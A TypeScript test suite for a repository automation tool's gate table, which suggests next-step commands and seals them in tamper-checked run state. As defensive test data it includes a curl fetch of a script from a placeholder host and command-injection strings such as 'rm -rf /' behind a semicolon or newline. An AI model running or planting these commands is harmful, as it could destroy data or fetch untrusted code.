/**
 * FactoryGate.next (gate-next.ts): the gate -> next step table, its
 * completeness against every gate name the engine source can park at, the
 * state shape check and seal of the sealed value, and the reader fallback for
 * states sealed before it existed.
 */
import { readdirSync, readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { cancelCommand, resumeCommand } from '../engine.js';
import { commandLine, gateNext, gateSteps, GATE_TABLE, stateGateNext, type GateNextFacts } from '../gate-next.js';
import { computeFactoryIntegrity, createFactoryState, GATE_NEXT_ARG_MAX_CHARS, GATE_NEXT_MAX_STEPS, parseFactoryState, setGate, verifyFactoryIntegrity, type FactoryRunState } from '../state.js';
import { RELEASE_TAMPER_COMMAND } from '../tamper-quarantine.js';

const RUN_DIR = join(dirname(fileURLToPath(import.meta.url)), '..');
const HEAD = 'a'.repeat(40);
const ROOT = '/work/repo';
const NOW = '2026-11-23T10:00:00.000Z';
const facts = (over: Partial<GateNextFacts> = {}): GateNextFacts => ({ key: 12, root: ROOT, forge: 'github', pr: 34, head: HEAD, ...over });
const argvs = (name: string, over: Partial<GateNextFacts> = {}) => gateNext(name, facts(over)).map((n) => n.argv);

const STATUS = ['omg', 'factory', 'run', 'status', '12'];
const RESUME = ['omg', 'factory', 'run', '12'];
const CANCEL = ['omg', 'factory', 'run', 'cancel', '12'];

/** Every gate name the engine source parks at with a literal name: this.gate('x'), setGate/park(..., 'x'), *_GATE = 'x', park objects { name: 'x' }, laneFailed(..., 'x'). */
function sourceGateNames(): string[] {
  const names = new Set<string>();
  for (const file of readdirSync(RUN_DIR).filter((f) => f.endsWith('.ts'))) {
    const text = readFileSync(join(RUN_DIR, file), 'utf8');
    const patterns = [
      /this\.gate\(\s*'([a-z-]+)'/g,
      /(?:setGate|this\.park)\([^']*?'review' \? [^']*'[^']*'[^']*'[^']*', '([a-z-]+)'/g,
      /(?:setGate|this\.park)\(x, '([a-z-]+)'/g,
      /_GATE = '([a-z-]+)'/g,
      /\{ name: '([a-z-]+)', reason/g,
      /laneFailed\([^;]*?, '([a-z-]+)'\);/g,
    ];
    for (const re of patterns) for (const m of text.matchAll(re)) names.add(m[1]);
  }
  return [...names].sort();
}

describe('the gate table covers every park the engine can produce', () => {
  it('every literal gate name in src/factory/run has an entry and a non-empty next', () => {
    const names = sourceGateNames();
    // The extraction itself works: a few names from each source shape.
    for (const n of ['merge', 'wall-time', 'state-tampered', 'gate-definition-changed', 'review-tampered', 'lane-tampered', 'heal-approve', 'gate-install-needed', 'review-invalid', 'gates']) expect(names).toContain(n);
    const missing = names.filter((n) => !gateSteps(n).known);
    expect(missing).toEqual([]);
    for (const n of names) {
      expect(gateNext(n, facts()).length, n).toBeGreaterThan(0);
      expect(gateNext(n, facts({ key: 'heal-0123abcd' })).length, n).toBeGreaterThan(0);
      expect(gateNext(n, facts({ forge: 'azure-devops' })).length, n).toBeGreaterThan(0);
    }
  });

  it('the lane-kind parks (`<kind>-failed`, `<kind>-declined`) are pattern entries; an unknown name falls back to status, rerun, cancel', () => {
    for (const kind of ['implement', 'review', 'fix', 'conflict-fix', 'ci-fix', 'coding-agent']) {
      expect(gateSteps(`${kind}-failed`).known).toBe(true);
      expect(gateSteps(`${kind}-declined`).known).toBe(true);
    }
    expect(argvs('ci-fix-failed')).toEqual([RESUME, STATUS, CANCEL]);
    expect(gateSteps('some-future-gate')).toMatchObject({ known: false, group: 'fix' });
    expect(argvs('some-future-gate')).toEqual([STATUS, RESUME, CANCEL]);
    expect(Object.keys(GATE_TABLE).every((n) => /^[a-z-]+$/.test(n))).toBe(true);
  });

  it('the engine command strings are the table argv', () => {
    expect(resumeCommand(12)).toBe(RESUME.join(' '));
    expect(cancelCommand(12)).toBe(CANCEL.join(' '));
    expect(resumeCommand('heal-0123abcd')).toBe('omg factory heal approve 0123abcd');
    expect(cancelCommand('heal-0123abcd')).toBe('omg factory heal cancel 0123abcd');
  });
});

describe('gateNext', () => {
  it('merge: the forge human merge command first; GitHub ghMergeCommand, local git merge into the root, Azure DevOps none', () => {
    expect(argvs('merge')).toEqual([['gh', 'pr', 'merge', '34', '--admin', '--merge', '--match-head-commit', HEAD], RESUME, STATUS]);
    expect(argvs('merge', { forge: 'local' })).toEqual([['git', '-C', ROOT, 'merge', '--no-ff', '--no-edit', HEAD], RESUME, STATUS]);
    expect(argvs('merge', { forge: 'azure-devops' })).toEqual([RESUME, STATUS]);
    // No 40-hex head or no PR: no merge step is made up.
    expect(argvs('merge', { head: 'main' })).toEqual([RESUME, STATUS]);
    expect(argvs('merge', { pr: undefined })).toEqual([RESUME, STATUS]);
  });

  it('the --allow-* gates: status first, the flag where the engine accepts it, cancel', () => {
    expect(argvs('gate-definition-changed')).toEqual([STATUS, [...RESUME, '--allow-gate-change'], CANCEL]);
    expect(argvs('gates-unsandboxed')).toEqual([STATUS, [...RESUME, '--allow-unsandboxed-gates'], CANCEL]);
    expect(argvs('secret-shaped-content')).toEqual([STATUS, RESUME, CANCEL]);
    expect(argvs('secret-shaped-content', { secretFindings: true })).toEqual([STATUS, RESUME, [...RESUME, '--allow-secret-shapes'], CANCEL]);
    expect(argvs('human-review')).toEqual([STATUS, RESUME, CANCEL]);
    expect(argvs('human-review', { unsandboxedLanes: true })).toEqual([STATUS, RESUME, [...RESUME, '--allow-unsandboxed-lanes'], CANCEL]);
    const flagged = gateNext('gates-unsandboxed', facts())[1];
    expect(flagged).toEqual({ label: 'rerun accepting it (--allow-unsandboxed-gates)', argv: [...RESUME, '--allow-unsandboxed-gates'], billed: true });
  });

  it('trust gates: status, the tamper release only while a hold is set, then rerun and cancel; decisions-rewritten has no rerun', () => {
    expect(argvs('lane-tampered')).toEqual([STATUS, RESUME, CANCEL]);
    expect(argvs('lane-tampered', { tamperHold: true })).toEqual([STATUS, RELEASE_TAMPER_COMMAND.split(' '), RESUME, CANCEL]);
    expect(argvs('state-tampered', { tamperHold: true })).toEqual([STATUS, ['omg', 'factory', 'run', 'release', '--tamper'], RESUME, CANCEL]);
    expect(argvs('decisions-rewritten')).toEqual([STATUS, CANCEL]);
    expect(argvs('gate-install-needed')).toEqual([RESUME, STATUS, CANCEL]);
  });

  it('heal runs: heal status / approve / cancel / close, no acceptance flags', () => {
    const key = 'heal-0123abcd' as const;
    const heal = (c: string) => ['omg', 'factory', 'heal', c, '0123abcd'];
    expect(argvs('heal-approve', { key })).toEqual([heal('status'), heal('approve'), heal('cancel'), heal('close')]);
    expect(argvs('heal-diagnosis', { key })).toEqual([heal('status'), heal('cancel'), heal('close')]);
    expect(argvs('merge', { key })).toEqual([['gh', 'pr', 'merge', '34', '--admin', '--merge', '--match-head-commit', HEAD], heal('approve'), heal('status')]);
    expect(argvs('gates-unsandboxed', { key })).toEqual([heal('status'), heal('cancel')]);
    // heal-close is for heal runs only.
    expect(argvs('heal-approve')).toEqual([STATUS, RESUME, CANCEL]);
  });

  it('marks the steps that can start billed lanes', () => {
    const billed = gateNext('secret-shaped-content', facts({ secretFindings: true })).map((n) => [n.argv.join(' '), n.billed === true]);
    expect(billed).toEqual([[STATUS.join(' '), false], [RESUME.join(' '), true], [`${RESUME.join(' ')} --allow-secret-shapes`, true], [CANCEL.join(' '), false]]);
    expect(gateNext('heal-approve', facts({ key: 'heal-0123abcd' })).filter((n) => n.billed).map((n) => n.argv[3])).toEqual(['approve']);
    expect(gateNext('merge', facts())[0].billed).toBeUndefined();
  });

  it('an invalid key gives nothing; a step its own state check would refuse (a root with a newline) is dropped', () => {
    expect(gateNext('merge', facts({ key: 0 }))).toEqual([]);
    expect(gateNext('merge', facts({ key: 'heal-xyz' as `heal-${string}` }))).toEqual([]);
    expect(argvs('merge', { forge: 'local', root: '/work/re\npo' })).toEqual([RESUME, STATUS]);
  });

  it('commandLine quotes a word with any other character', () => {
    expect(commandLine(['git', '-C', 'C:\\My Repo', 'merge', HEAD])).toBe(`git -C 'C:\\My Repo' merge ${HEAD}`);
    expect(commandLine(['echo', "it's; rm -rf /"])).toBe(`echo 'it'\\''s; rm -rf /'`);
  });
});

describe('FactoryGate.next in the sealed state', () => {
  const parked = (next?: unknown): FactoryRunState => {
    const s = { ...setGate(createFactoryState({ issue: 12, repoUrl: 'https://github.com/o/r', base: 'main' }, NOW), 'merge', 'merge is a human step', NOW), pr: 34, head: HEAD };
    return next === undefined ? s : { ...s, gate: { ...s.gate!, next } as FactoryRunState['gate'] };
  };
  const sealed = (s: FactoryRunState) => JSON.stringify({ ...s, integrity: computeFactoryIntegrity(s) });
  const parse = (raw: string) => parseFactoryState('run-12.json', 12, raw);

  it('a state with next parses and verifies; editing next breaks the seal', () => {
    const next = gateNext('merge', facts());
    const raw = sealed(parked(next));
    const s = parse(raw);
    expect(s.gate?.next).toEqual(next);
    expect(verifyFactoryIntegrity(s)).toBe(true);
    const edited = JSON.parse(raw) as FactoryRunState;
    edited.gate!.next![0].argv = ['curl', 'https://example.invalid/x.sh'];
    expect(verifyFactoryIntegrity(parse(JSON.stringify(edited)))).toBe(false);
    const dropped = JSON.parse(raw) as FactoryRunState;
    delete dropped.gate!.next;
    expect(verifyFactoryIntegrity(parse(JSON.stringify(dropped)))).toBe(false);
  });

  it('setGate keeps next alongside detail and definition', () => {
    const s = setGate(createFactoryState({ issue: 12, repoUrl: 'u', base: 'main' }, NOW), 'ci-failed', 'r', NOW, { detail: 'd', next: [{ label: 'l', argv: ['omg'] }] });
    expect(s.gate).toEqual({ name: 'ci-failed', reason: 'r', at: NOW, detail: 'd', next: [{ label: 'l', argv: ['omg'] }] });
  });

  it('shell metacharacters inside an argv word are data', () => {
    expect(() => parse(sealed(parked([{ label: 'merge', argv: ['git', '-C', "/r/$(x); `y` | 'z' & \"w\"", 'merge'] }])))).not.toThrow();
  });

  it.each([
    ['not an array', { label: 'x', argv: ['omg'] }],
    ['empty', []],
    ['too many steps', Array.from({ length: GATE_NEXT_MAX_STEPS + 1 }, () => ({ label: 'x', argv: ['omg'] }))],
    ['a newline in an argv word', [{ label: 'x', argv: ['omg', 'factory\nrm -rf /'] }]],
    ['a carriage return in a label', [{ label: 'x\r', argv: ['omg'] }]],
    ['an escape sequence', [{ label: 'x', argv: ['omg', '\u001b[2J'] }]],
    ['a bidi override', [{ label: 'x', argv: ['omg', 'a\u202eb'] }]],
    ['a line separator', [{ label: 'x', argv: ['omg', 'a\u2028b'] }]],
    ['an oversize word', [{ label: 'x', argv: ['omg', 'a'.repeat(GATE_NEXT_ARG_MAX_CHARS + 1)] }]],
    ['an oversize label', [{ label: 'x'.repeat(81), argv: ['omg'] }]],
    ['an empty argv', [{ label: 'x', argv: [] }]],
    ['an empty word', [{ label: 'x', argv: ['omg', ''] }]],
    ['too many words', [{ label: 'x', argv: Array.from({ length: 17 }, () => 'a') }]],
    ['a number word', [{ label: 'x', argv: ['omg', 12] }]],
    ['a missing label', [{ argv: ['omg'] }]],
    ['billed false', [{ label: 'x', argv: ['omg'], billed: false }]],
    ['billed a string', [{ label: 'x', argv: ['omg'], billed: 'yes' }]],
    ['an extra key', [{ label: 'x', argv: ['omg'], shell: true }]],
    ['a string argv', [{ label: 'x', argv: 'omg factory run 12' }]],
    ['a null step', [null]],
  ])('a hostile next is refused (state unreadable): %s', (_what, next) => {
    expect(() => parse(sealed(parked(next)))).toThrow(/malformed \(field gate\.next\)/);
  });

  it('a state sealed before next existed parses, verifies, and the reader table gives what the engine now seals', () => {
    const old = parked();
    expect(old.gate?.next).toBeUndefined();
    const s = parse(sealed(old));
    expect(verifyFactoryIntegrity(s)).toBe(true);
    // Identical output for the same gate either way: the fallback and the sealed value.
    const fallback = stateGateNext(s, ROOT);
    const withNext = parse(sealed(parked(gateNext('merge', facts()))));
    expect(fallback).toEqual(stateGateNext(withNext, ROOT));
    expect(fallback.map((n) => n.argv)).toEqual(argvs('merge'));
  });

  it('the reader prefers the sealed value over the table', () => {
    const custom = [{ label: 'read the run state', argv: STATUS }];
    expect(stateGateNext(parse(sealed(parked(custom))), ROOT)).toEqual(custom);
    expect(stateGateNext(createFactoryState({ issue: 12, repoUrl: 'u', base: 'main' }, NOW), ROOT)).toEqual([]);
  });
});
